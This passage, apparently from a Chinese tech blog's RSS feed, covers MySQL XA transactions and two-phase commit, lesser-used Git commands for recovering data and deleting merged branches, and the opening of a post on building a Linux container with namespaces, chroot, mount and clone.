&lt;li>&lt;code>XA PREPARE&lt;/code> 语句令XA事务进入&lt;code>PREPARED&lt;/code> 状态。&lt;code>XA RECOVER&lt;/code> 语句此时可以发现并列出此事务的 XID。&lt;code>XA RECOVER&lt;/code> 可以列出所有处于 &lt;code>PREPARED&lt;/code> 状态的 XA 事务的 XID。&lt;/li>
&lt;li>&lt;code>XA COMMIT ... ONE PHASE&lt;/code> 准备并提交XA事务。&lt;code>xid&lt;/code>不会列出在&lt;code>XA RECOVER&lt;/code>中，因为XA事务实际在执行语句后就结束了。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>一个处于&lt;code>PREPARED&lt;/code>状态的XA事务，可以发出&lt;code>XA COMMIT&lt;/code>语句来提交并结束XA事务，或发出&lt;code>XA ROLLBACK&lt;/code>来回滚并结束事务。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/MySQL-XA-and-2PC-DTP-model/xa-state-transition-diagram.png"
loading="lazy"
alt="image-20210831105435330"
>&lt;/p>
&lt;p>下面是一个简单的XA事务例子，作为一个全局事务，插入一个行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">START&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xatest&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">Query&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OK&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">mytable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">VALUES&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">Query&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OK&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">04&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">END&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xatest&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">Query&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OK&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PREPARE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xatest&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">Query&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OK&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">XA&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">COMMIT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;xatest&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">Query&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OK&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在给定客户端连接的上下文中，XA事务和本地事务彼此互斥。举例来说，如果&lt;code>XA START&lt;/code>发出并启动了一个XA事务，此时不能再启动一个本地事务直到XA事务被提交或回滚。反过来说，如果一个本地事务已经通过&lt;code>START TRANSACTION&lt;/code>启动，则不能执行任何XA语句直到本地事务被提交或回滚。&lt;/p>
&lt;p>如果一个XA事务在&lt;code>ACTIVE&lt;/code>状态，则不能发出任何产生隐式提交的语句（如 &lt;code>create table&lt;/code>），因为这违反了XA协议，导致不能回滚XA事务。尝试执行这类语句会导致一个错误：&lt;/p>
&lt;pre>&lt;code>ERROR 1399 (XAE07): XAER_RMFAIL: The command cannot be executed
when global transaction is in the ACTIVE state
&lt;/code>&lt;/pre>&lt;h4 id="xa-事务实验">XA 事务实验&lt;/h4>
&lt;p>准备数据库&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="k">create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">exists&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">exists&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">test123&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">bigint&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">primary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kp">auto_increment&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">`&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">varchar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="no">null&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动一个 XA 事务，插入表，最后提交。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="n">xa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;this-is-gtrid&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;this-is-bqual&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">insert&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">into&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">test123&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">values&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;distributed transaction!&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="n">xa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;this-is-gtrid&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;this-is-bqual&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c1">-- 准备
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">xa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">prepare&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;this-is-gtrid&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;this-is-bqual&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c1">-- 应该看到上一步 prepare 的 xa 事务
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">xa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">recover&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c1">-- 提交 xa 事务。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">xa&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">commit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;this-is-gtrid&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;this-is-bqual&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c1">-- 或者 rollback
&lt;/span>&lt;span class="c1">-- xa rollback &amp;#39;this-is-gtrid&amp;#39;,&amp;#39;this-is-bqual&amp;#39;;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行完成后，可以发现表中多了一条记录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test123&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>不常用的 Git 命令</title><link>https://nnnewb.github.io/blog/p/%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84-git-%E5%91%BD%E4%BB%A4/</link><pubDate>Fri, 09 Jul 2021 09:25:16 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84-git-%E5%91%BD%E4%BB%A4/</guid><description>&lt;p>大概是不太常用的一些 Git 命令。&lt;/p>
&lt;!-- more -->
&lt;h2 id="找回数据">找回数据&lt;/h2>
&lt;p>两种办法：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git reflog show
git reset --hard HEAD@&lt;span class="o">{&lt;/span>1&lt;span class="o">}&lt;/span> &lt;span class="c1"># 从上一步找到希望回退的位置&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git fsck --lost-found
&lt;span class="nb">cd&lt;/span> .git/lost-found/
&lt;span class="c1"># 用 git show hash 查看悬空对象的内容&lt;/span>
&lt;span class="c1"># 用 git merge hash 或者 git rebase hash 来恢复到当前分支里&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="合并分支时创建合并commit">合并分支时创建合并commit&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git config branch.master.mergeoptions &lt;span class="s2">&amp;#34;--no-ff&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="删除远程分支">删除远程分支&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git push --delete origin branch
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="删除已经合并的分支">删除已经合并的分支&lt;/h2>
&lt;p>&lt;a class="link" href="https://stackoverflow.com/questions/6127328/how-can-i-delete-all-git-branches-which-have-been-merged" target="_blank" rel="noopener"
>参考&lt;/a>&lt;/p>
&lt;h3 id="删除已合并的本地分支">删除已合并的本地分支&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git branch --merged &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> grep -E &lt;span class="s2">&amp;#34;^\\s+(patch|feat|refactor|test|misc)&amp;#34;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> xargs -I&lt;span class="o">{}&lt;/span> git branch -d &lt;span class="o">{}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="删除已合并的远程分支">删除已合并的远程分支&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git branch -r --merged &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> grep -E &lt;span class="s2">&amp;#34;^\\s+origin/(patch|feat|refactor|test|misc)&amp;#34;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> sed &lt;span class="s1">&amp;#39;s/origin\///&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> xargs -I&lt;span class="o">{}&lt;/span> &lt;span class="nb">echo&lt;/span> git push --delete origin &lt;span class="o">{}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>从零实现一个容器</title><link>https://nnnewb.github.io/blog/p/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8/</link><pubDate>Mon, 31 May 2021 16:16:52 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>自从看了&lt;code>cocker&lt;/code>项目的 ppt 之后就有点念念不忘的意思了，实现一个 docker 或 docker 的类似物看起来并不是做不到的事情。&lt;/p>
&lt;p>于是就动手试一试。&lt;/p>
&lt;h2 id="核心技术">核心技术&lt;/h2>
&lt;h3 id="namespace">namespace&lt;/h3>
&lt;p>命名空间包装全局系统资源，让在命名空间中的进程看起来就像是有自己独立隔离的全局资源一样。命名空间中的全局资源对命名空间中的其他进程都是可见的，但对命名空间外的进程不可见。命名空间用途之一就是实现容器。&lt;/p>
&lt;blockquote>
&lt;pre>&lt;code>Linux provides the following namespaces:
Namespace Constant Isolates
Cgroup CLONE_NEWCGROUP Cgroup root directory
IPC CLONE_NEWIPC System V IPC, POSIX message queues
Network CLONE_NEWNET Network devices, stacks, ports, etc.
Mount CLONE_NEWNS Mount points
PID CLONE_NEWPID Process IDs
User CLONE_NEWUSER User and group IDs
UTS CLONE_NEWUTS Hostname and NIS domain name
&lt;/code>&lt;/pre>
&lt;/blockquote>
&lt;p>几个命名空间的 API&lt;/p>
&lt;ul>
&lt;li>&lt;code>clone&lt;/code>&lt;/li>
&lt;li>&lt;code>setns&lt;/code>&lt;/li>
&lt;li>&lt;code>unshare&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>不得不说 &lt;code>man 7 namespaces&lt;/code> 对 &lt;code>namespace&lt;/code> 的解释已经非常到位了。&lt;/p>
&lt;h3 id="chroot">chroot&lt;/h3>
&lt;p>这个 Linux 用户应该还是比较熟悉的，如 Arch Linux 这样的发行版在安装时就有用到。&lt;/p>
&lt;p>使用 &lt;code>man 2 chroot&lt;/code> 查看这个 api 的文档。&lt;/p>
&lt;blockquote>
&lt;p>chroot() changes the root directory of the calling process to that specified in path. This directory will be used for pathnames beginning with /. The root directory is inherited by all children of the calling process.&lt;/p>
&lt;p>Only a privileged process (Linux: one with the CAP_SYS_CHROOT capability in its user namespace) may call chroot().&lt;/p>
&lt;/blockquote>
&lt;p>基本作用是把调用进程的根目录 &lt;code>/&lt;/code> 切换到指定目录，子进程会继承这个 &lt;code>/&lt;/code> 位置；调用 API 需要特权。&lt;/p>
&lt;p>举例说调完 &lt;code>chroot(&amp;quot;/home/xxx&amp;quot;)&lt;/code>，你再用 &lt;code>ls&lt;/code> 之类的命令看 &lt;code>/&lt;/code> 下有什么文件，看到的就是 &lt;code>/home/xxx&lt;/code> 下的内容了。&lt;/p>
&lt;p>&lt;code>man 2 chroot&lt;/code> 还有一些有意思的内容，不做赘述。&lt;/p>
&lt;h3 id="mount">mount&lt;/h3>
&lt;p>也是 Linux 用户很熟悉的东西。老规矩，&lt;code>man 2 mount&lt;/code> 看看文档。&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/mount.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">mount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">source&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">target&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">filesystemtype&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">long&lt;/span> &lt;span class="n">mountflags&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>mount() attaches the filesystem specified by source (which is often a pathname referring to a device, but can also be the pathname of a directory or file, or a dummy string) to the location (a directory or file) specified by the pathname in target.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>mount&lt;/code> 会挂载(attaches) &lt;code>source&lt;/code> 参数指定的文件系统（通常是设备路径，也可以是文件夹、文件的路径或虚拟字符串（如&lt;code>proc&lt;/code>））到 &lt;code>target&lt;/code> 指定的位置（目录或文件）。同样需要特权来执行。&lt;/p>
&lt;p>&lt;code>source&lt;/code>/&lt;code>target&lt;/code> 都不难理解，&lt;code>filesystemtype&lt;/code>可以从&lt;code>/proc/filesystems&lt;/code>里读到可用值，或者自己搜一搜；比较重要的就是 &lt;code>mountflags&lt;/code> 了，可以指定诸如&lt;code>MS_RDONLY&lt;/code>之类的选项来挂载只读文件系统等等。具体还是自己查手册。&lt;/p>
&lt;h3 id="clone">clone&lt;/h3>
&lt;p>最后就是系统调用 &lt;code>clone&lt;/code> 了。还是先 &lt;code>man 2 clone&lt;/code>。&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cm">/* Prototype for the glibc wrapper function */&lt;/span>
&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sched.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">clone&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">child_stack&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">...&lt;/span>
&lt;span class="cm">/* pid_t *ptid, void *newtls, pid_t *ctid */&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="cm">/* For the prototype of the raw system call, see NOTES */&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>clone() creates a new process, in a manner similar to fork(2).&lt;/p>
&lt;/blockquote>
&lt;p>总体类似于&lt;code>fork()&lt;/code>，但可以指定一个入口函数，函数结束则子进程退出，也可以共享内存空间，所以行为也可以类似线程。看怎么用。&lt;/p>
&lt;p>&lt;code>flags&lt;/code>依然是关注的重点，&lt;code>CLONE_NEWUTS&lt;/code>、&lt;code>CLONE_NEWNS&lt;/code>、&lt;code>CLONE_NEWPID&lt;/code>这些参数允许将子进程运行在独立的命名空间里。&lt;/p>
&lt;p>&lt;code>man 2 clone&lt;/code> 还提供了一个 C 语言编写的例子可以参考。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/wait.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/utsname.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sched.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#define errExit(msg) \
&lt;/span>&lt;span class="cp"> do \
&lt;/span>&lt;span class="cp"> { \
&lt;/span>&lt;span class="cp"> perror(msg); \
&lt;/span>&lt;span class="cp"> exit(EXIT_FAILURE); \
&lt;/span>&lt;span class="cp"> } while (0)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="cm">/* Start function for cloned child */&lt;/span>
&lt;span class="n">childFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">struct&lt;/span> &lt;span class="n">utsname&lt;/span> &lt;span class="n">uts&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="cm">/* Change hostname in UTS namespace of child */&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sethostname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;sethostname&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="cm">/* Retrieve and display hostname */&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">uts&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;uname&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;uts.nodename in child: %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uts&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">nodename&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="cm">/* Keep the namespace open for a while, by sleeping.
&lt;/span>&lt;span class="cm"> This allows some experimentation--for example, another
&lt;/span>&lt;span class="cm"> process might join the namespace. */&lt;/span>
&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Child terminates now */&lt;/span>
&lt;span class="p">}&lt;/span>
